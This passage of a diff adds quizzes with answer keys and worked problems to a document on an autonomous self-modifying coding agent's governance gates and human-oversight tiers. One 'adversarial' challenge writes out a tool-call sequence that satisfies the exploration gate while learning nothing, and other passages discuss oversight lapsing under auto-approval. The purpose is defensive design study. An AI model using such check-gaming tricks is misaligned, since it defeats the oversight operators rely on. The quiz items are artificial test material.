+<p>VALIDATE tests a sandbox copy of the candidate. VERIFY tests the files actually written to disk. The two can disagree. Some tests read from the filesystem, import order can differ, and state such as database connections is real only in VERIFY (§48.3). VERIFY runs only the tests that cover the changed files, so the check stays affordable, and failures go to L2 repair (§48.1). The Refinement 10 bug shows why "on disk" matters. L2 produced a fix that was never written to disk. It was re-checked against the sandbox, which passed, and the operation "completed" without the fix landing. Writing the fix with <code>change_engine.execute()</code> before VERIFY re-runs closed that gap (§48.2).</p>
+</details>
+<details class="cq"><summary>3. Session lessons have two separate safeguards: the infra-poisoning guard and the convergence metric. What failure does each one prevent, and why are both needed?</summary>
+<p>The infra guard works before injection. It tags failures such as DoubleWord timeouts as "infra" and keeps them out of the prompt. Otherwise the model might learn a false lesson such as "avoid calling DW", when the right response was simply to retry (§49.3). The convergence metric works after injection. Every 10 operations after the first lesson, it compares the success rate before and after lessons existed. If the rate has gone down, it clears the buffer (§49.4). The guard filters out one known kind of bad lesson. The metric catches any lessons that turn out to hurt, including code lessons that looked valid. Together they mean the lessons buffer is only kept while it helps.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-vii">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. An operation adds a new file in a non-core directory and changes nothing security-sensitive. Under the four-tier escalator, which tier applies?</p>
+<ol class="mcq-options" type="A">
+<li><code>SAFE_AUTO</code>, since it touches a single file</li>
+<li><code>APPROVAL_REQUIRED</code>, since new code is risky</li>
+<li><code>NOTIFY_APPLY</code>, because of the new-file rule</li>
+<li><code>BLOCKED</code>, since it creates files</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> Rule 10 places new files in the yellow <code>NOTIFY_APPLY</code> tier. The change applies automatically after a visible notice with a 5-second window to cancel (§45, §45.1).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. Which exploration categories must an <code>architectural</code> operation cover before the ledger lets it pass?</p>
+<ol class="mcq-options" type="A">
+<li><code>call_graph</code> and <code>history</code></li>
+<li><code>comprehension</code> and <code>discovery</code></li>
+<li><code>structure</code> and <code>call_graph</code></li>
+<li>None; architectural operations bypass the gate</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> The architectural floor is a score of 14.0, at least 4 categories, and <code>{call_graph, history}</code> as required categories. You cannot rewrite core code without knowing who calls it and why it was written that way (§47.3).</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. Operation A is active on <code>foo.py</code>. A new signal targets <code>[foo.py, bar.py]</code>. What does the intake router do?</p>
+<ol class="mcq-options" type="A">
+<li>Runs the new signal now, on <code>bar.py</code> only</li>
+<li>Merges the new signal into operation A</li>
+<li>Drops the new signal as a duplicate</li>
+<li>Queues it behind A until A completes</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> Any overlap queues the whole signal behind A, even though <code>bar.py</code> is free. When A is released, the signal is re-ingested and re-planned from the new state, which includes A's patch (§46.1, §46.2).</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. With the §50.1 formula: source <code>opportunity_miner</code> (base 5), urgency critical, 1 file, confidence 0.95, and 3 envelopes queued behind its files. What is its priority?</p>
+<ol class="mcq-options" type="A">
+<li>0</li>
+<li>-2</li>
+<li>2</li>
+<li>4</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> 5 - 3 (critical) + 0 (one file) - 1 (confidence of at least 0.9) - 3 (dependency credit, capped at 3) = -2. A lower number means higher priority (§50.1).</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-vii">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> Start from the three pending signals in the §50.2 table (A at -2, C at 4, B at 6). Add signal D: source <code>test_failure</code> (base 2), urgency high, 3 files, confidence 0.92, no dependency credit. Compute D's priority and the new dispatch order. Then suppose D and A both target <code>foo.py</code>. What actually happens to D at dispatch time?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>High urgency is worth 1, and 2 to 4 files cost 1. Then apply §46 to the shared file.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>D = 2 - 1 (high urgency) + 1 (3 files is within 2 to 4) - 1 (0.92 is at least 0.9) - 0 = 1 (§50.1). The order is A (-2), D (1), C (4), B (6).</p>
+<p>Priority decides only who is dispatched next. It does not override file locks. A dispatches first and registers <code>foo.py</code> in <code>_active_file_ops</code>. When D comes up, <code>_find_file_conflict</code> returns A's op id, so D is parked in <code>_queued_behind[A]</code> (§46.1). C can be dispatched in the meantime if its files do not overlap.</p>
+<p>When A completes, <code>release_op</code> frees <code>foo.py</code> and re-ingests D automatically. The retry path computes D's priority again (§50.3). D is then planned against a file that now includes A's patch (§46.2). If A crashed instead, the 300s TTL would force-release the lock so D is not stuck forever (§46.3).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> An operator finds the 5-second <code>NOTIFY_APPLY</code> window annoying and suggests moving every yellow-tier change to <code>SAFE_AUTO</code> (silent). Another operator suggests moving every yellow-tier change to <code>APPROVAL_REQUIRED</code>. Using §45 and §51, explain what each change would cost.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The paper calls the yellow tier a "trust-building mechanism". Ask what each extreme does to that trust.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The yellow tier covers new files, multi-file changes and core orchestration paths (§45). These are riskier than a single non-core file, but not risky enough to need a sign-off. The 5-second window tells the human before the change lands and lets them cancel, without requiring them to act (§45.1).</p>
+<p>Making the tier silent removes the moment where a problem can be caught. The paper's improvement loop depends on that moment: when a bad yellow change slips through, the operator steps in and the rules are refined. Silent changes would also undercut intent visibility (§44), because multi-file changes would land without the operator watching.</p>
+<p>Making the tier blocking would turn every multi-file change into a wait on a human, which is the outcome the yellow tier was invented to avoid. It would also clog the priority queue: §51 pairs severity with cost-aware priority so valuable work moves under suitable oversight, not under a blanket wait. A better answer keeps the window and tunes its length (Refinement 17 makes the delay configurable through <code>JARVIS_NOTIFY_APPLY_DELAY_S</code>, §52.10), or adjusts which rules put a change in yellow.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> §46 cites <code>unified_intake_router.py</code>. Today the file is <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code>. Find <code>_find_file_conflict</code> and the place where <code>_file_lock_ttl_s</code> is read from the environment. What is the default TTL? What does the current code check before it deletes a stale lock, and why would a plain "if older than TTL, delete" be unsafe?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look for a comment that mentions "CAS" and for <code>_active_file_ops_lock</code>.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The TTL is read as <code>float(os.environ.get("JARVIS_FILE_LOCK_TTL_S", "300"))</code>, so the default is 300 seconds. This matches §46.3 and Refinement 11 (§52.4).</p>
+<p>Inside <code>_find_file_conflict</code>, the code takes <code>_active_file_ops_lock</code> for each target file. It reads the <code>(op_id, registered_at)</code> entry and computes its age. If the age is over the TTL, it reads the entry again and deletes it only if both the op id and the timestamp are unchanged. This is a compare-and-swap (CAS). On deletion it logs the "Force-releasing stale file lock" warning that §46.3 describes. If the entry changed in the meantime, the code aborts the delete and logs at debug level.</p>
+<p>A plain age check followed by a delete has a race. Between reading the stale entry and deleting it, another <code>register_active_op</code> could write a fresh lock for the same file. A blind delete would remove that live lock, and two operations could then edit the file at once, which is the self-conflict the DAG exists to prevent (§46). The paper describes the TTL. The code adds a later hardening so that the TTL fix cannot itself remove a lock that is still in use.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. Exploration-first has now been enforced at three levels: a prompt instruction (§47.1), a post-GENERATE gate with GENERATE_RETRY (§47.2, §47.3), and in October a constrained-decoding grammar that allows only tool calls until the minimum exploration is met (§93.6). What does each level fail to guarantee, and why did the 30B need the third?</summary>
+<p>The prompt (§47.1) guarantees nothing. It is a request, and §47.2 says plainly that "a model can ignore instructions." The gate (§47.2, §47.3) guarantees that no candidate gets past GENERATE without enough exploration. It does this after the fact, though: the model has to produce a non-compliant answer, get rejected, and retry. That works for a model that improves when given feedback. §47.5 shows Claude-era Session G doing exactly that, going from <code>score=3.00</code> to <code>score=25.50</code> across five categories.</p>
+<p>The 30B did not improve on retry. §93.6 records 106 in-loop rejections and zero candidates in <code>bt-2026-08-31-155308</code>. A gate that only rejects cannot help a model that never produces a compliant answer, so every retry burned budget and produced the same failure. The grammar moves enforcement from rejecting the output to restricting what the model can generate at all: an answer without exploration becomes impossible to emit.</p>
+<p>The grammar has its own gap. It guarantees that tool calls happen, not that they are relevant or diverse. The A/B in §93.6 shows how a model behaves under it. With {tool, noop} allowed, the 30B chose noop 3 out of 3 times: it took the cheapest legal exit. Only with {tool} alone did it explore 3 out of 3. So the diversity scoring and anti-gaming rules of §47.3 and §47.4 still do work that the grammar cannot. The three levels are complementary, not redundant.</p>
+</details>
+<details class="cq-adv"><summary>A2. §49 describes session lessons, and §49.4 adds a convergence metric. §93.8 reports LessonMemory: 1,115 module-keyed lessons, with "424 injections followed by a VALIDATE pass." Does either figure show that lessons help? Argue a position and name the evidence that would settle it.</summary>
+<p>Neither figure shows that lessons help. "424 injections were followed by a VALIDATE pass" is a count of co-occurrences. It has no denominator of passes without injection and no comparison arm. If the base VALIDATE pass rate on similar operations were the same, 424 would be exactly what you would expect with lessons having no effect.</p>
+<p>The §49.4 metric does compare something: success rates before and after the first lesson. But the two windows differ in more than the lessons. They cover different operations, at different points in a session, and possibly with different queue mixes (the §50 priority sends critical, focused work first, so later work may be harder). A drop after the first lesson can therefore reflect harder work, not bad lessons, and the buffer gets cleared anyway.</p>
+<p>A defensible position is that lessons are plausible but unproven. The design is still sound because it is cheap and fails safe: the infra guard (§49.3) and the clear-on-regression rule (§49.4) cap the damage. The evidence that would settle it is a randomized withhold: for each eligible operation, inject or withhold lessons by coin flip, and compare VALIDATE pass rates (and landings) between the arms over operations drawn from the same queue. This is the same standard §93.11 applies to the trained adapter, where a held-out gain is required before anything counts as learning.</p>
+</details>
+<details class="cq-adv"><summary>A3. §45.1 calls NOTIFY_APPLY a "trust-building mechanism": a human watches a 5 s window and refines the rules when something slips through. In October, Autonomous Sentinel Mode auto-approves up to APPROVAL_REQUIRED (§93.7). What happens to that trust-building loop, and what replaced it?</summary>
+<p>The §45.1 loop has three parts: a human sees the change, has a window to cancel, and refines the rules after a bad Yellow operation slips through. Each part assumes someone is watching. Under Sentinel Mode the organism finds its own work, signs it, and auto-approves up to the tier ceiling. By default that ceiling is APPROVAL_REQUIRED (§93.7), which means even Orange operations proceed without a human. The 5 s window still runs, but in an unattended soak nobody types <code>cancel</code>, so the loop no longer has its observer.</p>
+<p>The design replaced live human vigilance with checks that run after the fact and can be undone. Work lands in a sovereignty worktree, accumulates on a session branch, and must pass a promotion gate that checks provenance, coverage, and that no public symbol vanished. Survivors are fast-forwarded onto local <code>main</code> only. A zero-push air-gap keeps publishing an operator act (§93.7). BLOCKED operations, self-modification of the governance layer, and anything touching the cage still escalate to a human.</p>
+<p>The "refine the rules" step survived, but it now happens offline. §93.14 item 2 lists wrong landings: one hollow, one with no intended change, one that dropped content, and a documentation edit that flattened text. It says the promotion gate and the Test Reality Gate "exist because of these." That is the §45.1 loop with a longer delay: a human still finds the slip and hardens a rule, but after the commit is already on local <code>main</code>, not during a 5 s window. The trade-off is unattended throughput in exchange for later detection, and the air-gap is what keeps that later detection safe.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (cross-Part trace).</strong> October system (§93.6): J-Prime is the only lane. A <code>doc_staleness</code> operation is active on <code>parser.py</code>. A <code>test_failure</code> signal at CRITICAL urgency then arrives for <code>parser.py</code> only, with confidence 0.95 and complexity <code>simple</code>. Trace it to the end: intake (§52.8, §50, §46), routing (§42.3, §42.5), GENERATE (§93.6, §47.3), APPLY and VERIFY (§48, §52.3), and the lesson it leaves (§49). Along the way, the model's first attempt makes two identical <code>read_file</code> calls on <code>parser.py</code>. Later, the scoped post-apply tests fail once. Name every gate that acts and what it does.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Duplicates earn zero credit (§47.3). Ask what <code>simple</code> requires. Also ask which enqueue path the test-failure signal takes when the doc operation releases its lock (§50.3).</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Intake.</strong> Coalescing (§52.8) would merge same-file signals within 30 s, but HIGH-urgency signals bypass it. Treating CRITICAL as at least HIGH, the signal is not held. Priority (§50.1): base 2 for <code>test_failure</code> (as in §50.2), minus 3 for critical, plus 0 for one file, minus 1 for confidence at or above 0.9, minus 0 dependency credit, giving −2. The DAG (§46) finds <code>parser.py</code> active under the doc operation, so the signal waits in <code>_queued_behind</code>. When the doc operation completes, <code>release_op</code> re-ingests it, and the retry enqueue path recomputes the same priority (§50.3), so it goes to the front.</p>
+<p><strong>Routing.</strong> Complexity <code>simple</code> is not in <code>_COMPLEX_COMPLEXITIES</code>, and the source is not speculative or background. It is an immediate source at CRITICAL, so §42.3 returns IMMEDIATE, with a 60 s plus 5 s generation budget (§42.5). In October the free-lane policy serves that route from the local engine (§93.6).</p>
+<p><strong>GENERATE.</strong> Tool masking allows only tool calls until the minimum exploration is met (§93.6). The model calls <code>read_file(parser.py)</code> twice. The second call is a duplicate and earns zero credit (§47.3). The ledger then sees one COMPREHENSION call. The <code>simple</code> floor is a score of 4.0 and two categories, so it fails. The Iron Gate raises GENERATE_RETRY with targeted feedback (§47.2). On retry the model adds, for example, <code>get_callers</code> (CALL_GRAPH), reaches two categories and enough score, and produces a candidate. All of this has to fit inside the 65 s IMMEDIATE budget, so the duplicate cost real time.</p>
+<p><strong>Risk.</strong> One file and not a core path, so the operation is SAFE_AUTO and applies silently (§45). Because it was generated after the doc operation released the file, the GENERATE-time hashes match at APPLY (§52.7), and the stale guard stays quiet.</p>
+<p><strong>VERIFY.</strong> The scoped tests fail once (§48.1). VERIFY builds a synthetic ValidationResult and calls L2. Under Refinement 10 the L2 fix is written to disk with <code>change_engine.execute()</code> before VERIFY runs again (§52.3). If L2 converges, the operation completes. If not, the result is combined with the benchmark result and rolled back.</p>
+<p><strong>Lesson.</strong> If it completes, an <code>[OK]</code> lesson enters the buffer. If it rolls back on a test failure, a <code>[FAIL:test]</code> lesson is tagged "code" and injected into later prompts (§49.1, §49.2). If it died on a timeout, the lesson is tagged "infra" and excluded (§49.3).</p>
+<p><strong>Check.</strong> The gates that acted were coalescing-bypass, DAG queueing, the priority recompute, the router, tool masking, the exploration ledger and its retry, the risk tier, the stale-hash guard, VERIFY with L2, and lesson tagging. Each is cited to the section that defines it. Nothing here required a mechanism the paper does not describe.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (adversarial).</strong> Act as a lazy model under the ExplorationLedger. Your target is a <code>moderate</code> operation on <code>billing.py</code>. The floor is a score of at least 8.0 across at least 3 categories (§47.3). Construct a tool-call sequence that passes the gate while learning nothing about <code>billing.py</code>. Then determine which layer in Parts VII and VIII, or in §93, stops the resulting patch, and whether any of them stops it <em>because</em> exploration was shallow.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Read §47.3 and §47.4 for what is checked: distinct tool and argument pairs, categories, and success. Is the <em>target file</em> named anywhere in the gate condition, as opposed to in the prompt (§47.1)?</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>The attack.</strong> The ledger awards credit to distinct, successful calls and counts categories (§47.3, §47.4). It checks three conditions: score, category count, and required categories (none for <code>moderate</code>). None of them mentions the target file. A sequence like this meets the shape:</p>
+<ol>
+<li><code>read_file(README.md)</code> for COMPREHENSION.</li>
+<li><code>list_dir(docs/)</code> and <code>glob_files("*.cfg")</code> for DISCOVERY.</li>
+<li><code>git_log</code> on an unrelated path for HISTORY.</li>
+<li>More distinct, successful reads of unrelated files until the score clears 8.0.</li>
+</ol>
+<p>The paper does not publish per-call weights, so the number of extra calls is unknown. The anti-gaming rules do not block any of this. Duplicates earn zero credit, but every call here is distinct. Failed calls do not cover categories, but every call here succeeds. Three categories are covered and the score rises with each new call.</p>
+<p><strong>Who stops it?</strong> The prompt (§47.1) asks for the target file to be read, but §47.2 counts any <code>read_file</code>. Tool masking (§93.6) forces tool calls, not relevant ones. The stale-hash guard (§52.7) checks concurrency, not understanding. So nothing stops the shallow exploration itself. What stops a <em>bad patch</em> are the outcome gates. VALIDATE runs tests against the candidate. VERIFY reruns scoped tests on disk (§48). In October, the Test Reality Gate rejects tests that never import their subject or assert nothing, and the promotion gate refuses a landing where a public symbol vanished (§93.7, §93.8). The AST-Signature Anchor also injects the real module API whether or not the model explored (§93.8), which makes a blind patch less likely to invent functions.</p>
+<p><strong>Honest verdict.</strong> No layer catches shallow exploration as such. A patch that is shallow but correct passes everything. That is arguably acceptable, because the outcome gates are authoritative and exploration is a means, not an end. §93.6 also shows this pressure is real: given {tool, noop}, the 30B chose noop every time, so models do take the cheapest legal path.</p>
+<p><strong>A proposal (not in the paper).</strong> Require that at least one COMPREHENSION credit names a path in the operation's target files, and for <code>architectural</code>, that the CALL_GRAPH credit names a target symbol. Check the fix by replaying the attack sequence above: it should now fail on the new required condition while an honest sequence that starts by reading <code>billing.py</code> still passes.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -2471,6 +3666,16 @@ Together, these seven capabilities are the difference between a pipeline that ex
 
 **Fix:** exploration-only tool rounds are capped at `JARVIS_MAX_EXPLORATION_ROUNDS` (default 5). After the cap, a system message nudges the model: *"You have enough context. Produce your final code change now."*
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-viii-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Look back over the twelve refinements. How many do you think were planned in the original design? Most of them could have been an "env var workaround" or a change to the architecture. Which kind of fix do you expect dominates?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>None were planned up front. Each one responds to a real observation, so the architecture is "hardened, not pristine". Most were solved by changing the architecture, not by adding a configuration workaround. Examples are a TTL on locks, a scope fix on APPLY and a convergence metric on lessons. This reflects the Manifesto's rule of structural repair, not patches. See §53.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §53. What the Refinements Teach
 
 Two lessons emerge from this list.
@@ -2478,6 +3683,167 @@ Two lessons emerge from this list.
 **First, production-grade is iterative.** Every refinement is a response to a real observation. None of them were designed up front. The architecture is *hardened*, not pristine — it has the marks of having been stress-tested in the wild, each mark paired with a fix that makes the next wild run survivable.
 
 **Second, structural fixes outperform configurational patches.** Many of these refinements could have been patched as "add env var X to work around problem Y." Instead, most were solved by changing the architecture: TTL on locks, scope fixes on APPLY, convergence metrics on lessons. The Manifesto's zero-shortcut mandate — *structural repair, not patches* — is visible in the refinement history.
+
+<!-- engage:begin -->
+#### Check your understanding: PART VIII — Edge Case Hardening (Twelve Refinements)
+
+<div class="engage" id="engage-part-viii">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Refinement 11 (lock TTL) and Refinement 14 (file-hash stale guard) both deal with concurrent operations on one file. How do they differ in what they protect?</summary>
+<p>Refinement 11 protects progress. A crashed operation could leave a file locked forever, and every later signal for that file would queue behind it. Locks older than <code>JARVIS_FILE_LOCK_TTL_S</code> (300s) are therefore force-released with a warning (§52.4). Refinement 14 protects correctness. A candidate built from a read of file X at time T1 might be applied after another operation changed X. File SHA-256 hashes taken at GENERATE are compared again at APPLY to detect this (§52.7). The TTL can release a lock early by design, so the hash check is a second line of defence behind the DAG lock (§46). It catches stale candidates that the lock system did not prevent.</p>
+</details>
+<details class="cq"><summary>2. Refinement 15 merges same-file signals that arrive within 30 seconds, but lets HIGH-urgency signals skip the merge. What trade-off does that make?</summary>
+<p>Coalescing removes redundant work. Without it, several sensors that notice the same file within seconds would create N separate operations on the same target (§52.8). The price is latency: a signal may wait up to the window, 30s by default, in case others join it. For routine work that delay is cheap and the saving is real. For urgent signals the delay is the costly part, so HIGH urgency skips the buffer, because those signals "should not wait 30s for potential merges". The design accepts some duplicated work on urgent paths in exchange for responsiveness.</p>
+</details>
+<details class="cq"><summary>3. Several refinements make the system correct itself instead of relying on an operator. Pick two and explain what each one corrects, and against what evidence.</summary>
+<p>Refinement 18, the convergence metric, judges the lessons buffer by results. Every 10 operations after the first lesson, it compares the success rate before and after lessons. If lessons made things worse, it clears them (§52.11). Refinement 19, exploration budget control, judges model behaviour against a fixed budget. After <code>JARVIS_MAX_EXPLORATION_ROUNDS</code> (5) exploration-only rounds, it nudges the model to produce its change (§52.12). Both turn an open-ended failure, misleading guidance or an endless read loop, into a bounded one with a deterministic trigger. This is the §53 point: the fix is built into the architecture, not left to an operator noticing.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-viii">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. What did Refinement 13 (session intelligence thread-safety) change?</p>
+<ol class="mcq-options" type="A">
+<li>It wrapped <code>_session_lessons</code> in a threading lock</li>
+<li>It moved the lessons buffer into its own process</li>
+<li>It documented asyncio safety and when a lock becomes necessary</li>
+<li>It cut the lessons buffer from 20 entries to 1</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> Access is safe under asyncio's single-threaded event loop. The fix documents this and adds a comment that an <code>asyncio.Lock</code> is needed if the orchestrator ever becomes multi-threaded (§52.6).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. What happens once a model reaches <code>JARVIS_MAX_EXPLORATION_ROUNDS</code>?</p>
+<ol class="mcq-options" type="A">
+<li>A system message tells it to produce its final change now</li>
+<li>The operation is cancelled with reason <code>user_cancelled</code></li>
+<li>The operation moves up one risk tier</li>
+<li>The model is switched to the fallback provider</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> Exploration-only rounds are capped at 5 by default. After that, a system message says: "You have enough context. Produce your final code change now." (§52.12).</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. Where does Refinement 16 check the cooperative cancellation flag set by <code>cancel &lt;op-id&gt;</code>?</p>
+<ol class="mcq-options" type="A">
+<li>On every tool call inside the Venom loop</li>
+<li>Only at the final COMPLETE phase</li>
+<li>Through an OS signal sent to the orchestrator process</li>
+<li>At the GENERATE and APPLY phase boundaries</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> The flag is checked at the GENERATE and APPLY phase boundaries. A cancelled operation moves to <code>CANCELLED</code> with reason <code>user_cancelled</code>, and the process keeps running (§52.9).</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. Why is the dependency credit in Refinement 9 capped at 3?</p>
+<ol class="mcq-options" type="A">
+<li>The priority queue holds only three slots</li>
+<li>To stop runaway promotion of a single signal</li>
+<li>Three is the number of enqueue paths</li>
+<li>To match the three DoubleWord tiers</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> <code>_dep_credit</code> counts the envelopes queued behind the files an operation would touch. The cap of 3 stops that count from pushing one signal to the top no matter what else is waiting (§52.2).</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-viii">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> At t = 0, operation A starts on <code>parser.py</code> and then crashes without releasing its lock. At t = 10s, two sensors each send a normal-urgency signal for <code>parser.py</code>. At t = 20s, a HIGH-urgency test failure for <code>parser.py</code> arrives. Using Refinements 11 and 15, describe what happens to each signal. When is the lock first eligible for force-release?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Coalescing (30s window) and the file lock (300s TTL) are separate mechanisms. Apply each one in turn.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The two normal-urgency signals arrive within <code>JARVIS_COALESCE_WINDOW_S</code> (30s) of each other for the same file, so they merge into one multi-goal operation (§52.8). The HIGH-urgency signal skips coalescing and goes straight to dispatch (§52.8).</p>
+<p>Both the merged operation and the HIGH signal then hit the DAG check. <code>parser.py</code> is still registered to crashed operation A, so each is queued behind A (§46.1). A will never complete, so <code>release_op</code> will never run for it.</p>
+<p>Refinement 11 breaks the deadlock. Locks carry timestamps, and <code>_find_file_conflict()</code> force-releases any lock older than <code>JARVIS_FILE_LOCK_TTL_S</code>, 300s by default, with a warning (§52.4). The lock first becomes eligible once it is more than 300s old, at about t = 300s, and it is released when the next conflict check runs. Until then even the urgent test failure waits, because skipping the coalescing window does not override a file lock.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> Refinement 14 (stale exploration guard) is currently a soft gate: a hash mismatch at APPLY gives a warning and a ledger entry. A reviewer wants it to be a hard gate that rejects the candidate. Using §52.7 and §53, argue both sides and say what evidence would justify the change.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The paper says why it is soft: "without blocking routine operations in low-concurrency scenarios". Ask what a mismatch means in each case.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>For a hard gate: a mismatch means the candidate was built on stale file state. If applied, it "would overwrite the concurrent change", which is silent data loss (§52.7). A warning records the problem but does not stop it.</p>
+<p>For keeping it soft: the paper says the soft gate exists to avoid "blocking routine operations in low-concurrency scenarios" (§52.7). When little runs concurrently, mismatches should be rare. A hard reject would throw away work that took a GENERATE call, and any false positive would cost real throughput. The DAG lock (§46) is already the first line of defence against two operations editing the same file.</p>
+<p>The §53 approach points to deciding from evidence. The ledger entries the soft gate writes are that evidence. If they show mismatches that matched real lost edits, the structural fix is justified, and it could be narrow: hard-fail only when the hash differs and another operation is known to have written the file, or route the candidate back to GENERATE against the new state instead of rejecting it. If the ledger shows almost no mismatches, the soft gate is doing its job cheaply.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Refinement 15 lives in <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code>. Find where <code>_coalesce_window_s</code> is read, the method <code>_coalesce_key</code>, and the dispatch-loop branch commented "HIGH urgency: bypass coalescing". What exact condition skips the buffer? How are envelopes grouped? What happens to envelopes that have no target files?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The docstring of <code>_coalesce_key</code> describes a soak that merged two unrelated problems into one operation.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The window is read as <code>float(os.environ.get("JARVIS_COALESCE_WINDOW_S", "30"))</code>, which matches the 30s default in §52.8.</p>
+<p>The bypass condition is <code>envelope.urgency == "high" or self._coalesce_window_s &lt;= 0</code>. A HIGH signal, or a window set to zero or less, dispatches at once. Everything else is appended to <code>_coalesce_buffer[key]</code>, and the time of first arrival is recorded. <code>_flush_expired_coalesce_buffers</code> dispatches each buffer once the window has passed since that first arrival.</p>
+<p><code>_coalesce_key</code> groups envelopes by their sorted target files joined with "|", which implements "same file" from §52.8. Envelopes with empty <code>target_files</code> do not share an empty key. They fall back to the envelope's provenance <code>signature</code>, and failing that to its unique <code>idempotency_key</code>, so they never merge. The docstring says why: soak bt-2026-05-17-213727 merged two distinct problems into one "Frankenstein" operation through the shared empty key. This edge case was found after the April paper and fixed in the same structural way §53 describes.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. The paper describes exploration-first enforcement twice, and the two descriptions disagree. §52.5 (Refinement 12) says the check runs "at VALIDATE time" and that violations "produce a warning and are recorded in the per-candidate ledger." §47.2 says the Iron Gate runs post-GENERATE, pre-VALIDATE, and that violations produce a GENERATE_RETRY. Which is authoritative, and why does the difference matter?</summary>
+<p>The two passages describe different strengths of the same rule. §52.5 describes a soft, observational check: a warning plus a ledger record, applied after the candidate already exists. §47.2 describes a hard gate: the candidate is rejected and the model is sent back with targeted feedback before VALIDATE spends anything on it. The paper does not reconcile them.</p>
+<p>The current code sides with §47.2. In <code>backend/core/ouroboros/governance/phase_runners/generate_runner.py</code>, the GENERATE runner raises <code>ExplorationInsufficientError</code> and advances the context to <code>OperationPhase.GENERATE_RETRY</code>. So the gate is enforced in GENERATE, not only logged at VALIDATE. A plausible reading is that §52.5 records the refinement as first written, and §47.2 and §47.3 record where it ended up. That fits §53's claim that the refinements were hardened over time. The paper itself does not say this, so treat it as an inference.</p>
+<p>The difference matters for two reasons. First, cost: a soft check lets an unexplored candidate consume a VALIDATE run (a sandbox and a test suite) before anyone notices, while the hard gate stops it earlier. Second, behaviour: only a hard gate produces the retry feedback that §47.5's Session G adaptation depends on. A warning in a ledger teaches the model nothing. It also matters for §93.6, because the 30B's 106 in-loop rejections came from this gate being hard. A soft check would have let those candidates through to VALIDATE instead.</p>
+</details>
+<details class="cq-adv"><summary>A2. Refinement 14 snapshots file hashes at GENERATE and compares them at APPLY, as a soft gate (§52.7). By October, operations execute in isolated sovereignty worktrees, accumulate on a session branch, and are fast-forwarded onto local <code>main</code> (§93.7). Writes are also verified by a SHA-256 check on disk (§93.2). Where does stale-state detection live now, and is Refinement 14 still pulling its weight?</summary>
